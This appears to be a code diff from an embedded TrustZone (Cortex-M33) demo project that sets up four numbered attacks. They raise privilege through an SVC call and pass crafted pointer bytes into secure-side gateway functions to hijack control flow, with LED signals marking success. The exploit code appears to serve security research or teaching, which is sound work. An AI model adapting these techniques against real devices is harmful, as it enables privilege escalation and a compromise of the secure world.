@@ -8,10 +8,10 @@
 #include "Board_LED.h"                         /* ::Board Support:LED */
 #include "..\IOTKit_CM33_s\Secure_Functions.h" /* Secure Code Entry Points */
 
-// #define ATTACK1
-#define ATTACK2
-// #define ATTACK3
-// #define ATTACK4
+//#define ATTACK1
+//#define ATTACK2
+//#define ATTACK3
+#define ATTACK4
 
 #define DROP_NS_PRIVILEGES __asm("msr CONTROL, %[reg] " ::[reg] "r"(1) \
 : "memory")
@@ -19,13 +19,14 @@
 #define SET_NS_PRIVILEGES __asm("msr CONTROL, %[reg] " ::[reg] "r"(0) \
 : "memory")
 
-void attacker_controlled(void) __attribute__((section("unprivilege_code")));
-void attack_1(void) __attribute__((section("unprivilege_code"), noinline));
-void attack_2(void) __attribute__((section("unprivilege_code"), noinline));
-void attack_3(void);
-void attack_4(void);
+
+void attack_1(void) __attribute__((noinline));
+void attack_2(void) __attribute__((noinline));
+void attack_3(void) __attribute__((noinline));
+void attack_4(void) __attribute__((noinline));
 void print_LCD(char *msg);
 void attack_2_svc(char *msg);
+void raise_privilege(void);
 
 char text[] = "Hello World (non-secure)\r\n";
 
@@ -45,42 +46,9 @@ int32_t NonSecure_LED_Off(uint32_t num)
 }
 
 /*----------------------------------------------------------------------------
-  SysTick IRQ Handler
- *----------------------------------------------------------------------------*/
-void SysTick_Handler(void);
-void SysTick_Handler(void)
-{
-    static uint32_t ticks;
-
-    switch (ticks++)
-    {
-    case 10:
-        LED_On(7u);
-        break;
-    case 20:
-        Secure_LED_On(6u);
-        break;
-    case 30:
-        LED_Off(7u);
-        break;
-    case 50:
-        Secure_LED_Off(6u);
-        break;
-    case 99:
-        ticks = 0;
-        break;
-    default:
-        if (ticks > 99)
-        {
-            ticks = 0;
-        }
-    }
-}
-
-/*----------------------------------------------------------------------------
   SVC IRQ Handler
  *----------------------------------------------------------------------------*/
-
+void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val) __attribute__((section("privilege_code")));
 void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
 {
     uint32_t stack_frame_addr;
@@ -105,20 +73,26 @@ void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
             print_LCD_nsc((char *) svc_args[0]);
             break;
         case 2:
-            attack_2_nsc((char *) svc_args[0]);
+            blxns_nsc((char *) svc_args[0]);
             break;
         default:
             break;
     }
 }
 
-void __attribute__((naked)) SVC_Handler(void)
+void __attribute__((section("privilege_code"), noinline, naked)) SVC_Handler(void)
 {
     __asm volatile(
         "mov r0, lr\n\t"
         "mov r1, sp\n\t"
         "b   SVC_Handler_Main\n\t"
     );
+}
+
+int get_driver_status() __attribute__((section("privilege_code"), optnone));
+int get_driver_status()
+{
+	return 0;
 }
 
 void print_LCD(char *msg)
@@ -130,7 +104,7 @@ void print_LCD(char *msg)
     );
 }
 
-void attack_2_svc(char *msg)
+void attack_2_print_LCD(char *msg)
 {
     register char* r0 __asm("r0") = msg;
     __asm volatile("svc #2"
@@ -139,6 +113,26 @@ void attack_2_svc(char *msg)
     );
 }
 
+void raise_privilege(void)
+{
+    __asm volatile("svc #0");
+}
+
+void atk_3_print_LCD(char *msg) __attribute__((section("privilege_code"), noinline));
+void atk_3_print_LCD(char *msg)
+{
+    print_LCD_nsc(msg);
+    LED_On(1u);
+}
+
+void atk_4_print_LCD(char *msg) __attribute__((section("privilege_code"), noinline));
+void atk_4_print_LCD(char *msg)
+{
+    blxns_nsc(msg);
+    LED_On(2u);
+}
+
+void attacker_controlled(void);
 void attacker_controlled(void)
 {   
     LED_On(7u);
@@ -147,18 +141,32 @@ void attacker_controlled(void)
 
 void attack_1(void)
 {
-    DROP_NS_PRIVILEGES;
     char user_input[28] = {
-        0x00,0x00,0x21,0x00};
+        0x4c,0x06,0x20,0x00};
     print_LCD(user_input);
 }
 
 void attack_2(void)
 {
-    DROP_NS_PRIVILEGES;
     char user_input[28] = {
-        0x00,0x00,0x21,0x00};
-    attack_2_svc(user_input);
+        0x4c,0x06,0x20,0x00};
+    attack_2_print_LCD(user_input);
+}
+
+void attack_3(void)
+{
+    raise_privilege();
+    char user_input[28] = {
+        0x4c,0x06,0x20,0x00};
+    atk_3_print_LCD(user_input);
+}
+
+void attack_4(void)
+{
+    raise_privilege();
+    char user_input[28] = {
+        0x4c,0x06,0x20,0x00};
+    atk_4_print_LCD(user_input);
 }
 
 static uint32_t x;
@@ -184,6 +192,8 @@ int main(void)
     /* register NonSecure callbacks in Secure application */
     Secure_LED_On_callback(NonSecure_LED_On);
     Secure_LED_Off_callback(NonSecure_LED_Off);
+	if (pass_nsfunc_ptr_o_int_i_void(&get_driver_status))
+		while(1);
 
 #if 0
     LED_Initialize ();                      /* already done in Secure part */
@@ -191,7 +201,9 @@ int main(void)
 
     SystemCoreClockUpdate();
     SysTick->CTRL = 0;
-
+    
+    DROP_NS_PRIVILEGES;
+    
     #ifdef ATTACK1
     attack_1();
     #elif defined ATTACK2
@@ -201,7 +213,7 @@ int main(void)
     #elif defined ATTACK4
     attack_4();
     #endif
-    
+    attacker_controlled();
     LED_On(0u);
     while (1)
     {
